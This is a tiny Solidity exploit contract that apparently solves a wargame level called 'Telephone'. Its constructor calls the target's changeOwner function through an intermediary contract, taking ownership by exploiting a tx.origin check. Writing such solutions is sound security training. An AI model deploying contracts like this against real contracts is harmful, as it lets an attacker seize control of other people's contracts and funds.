// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.18;

/**
 * @title TelephoneAttacker
 * @dev This contract is used to attack the Telephone contract
 */
contract Attacker {
    constructor(address _telephone) {
        Telephone telephone = Telephone(_telephone);
        telephone.changeOwner(msg.sender);
    }
}

interface Telephone {
    function changeOwner(address _owner) external;
}
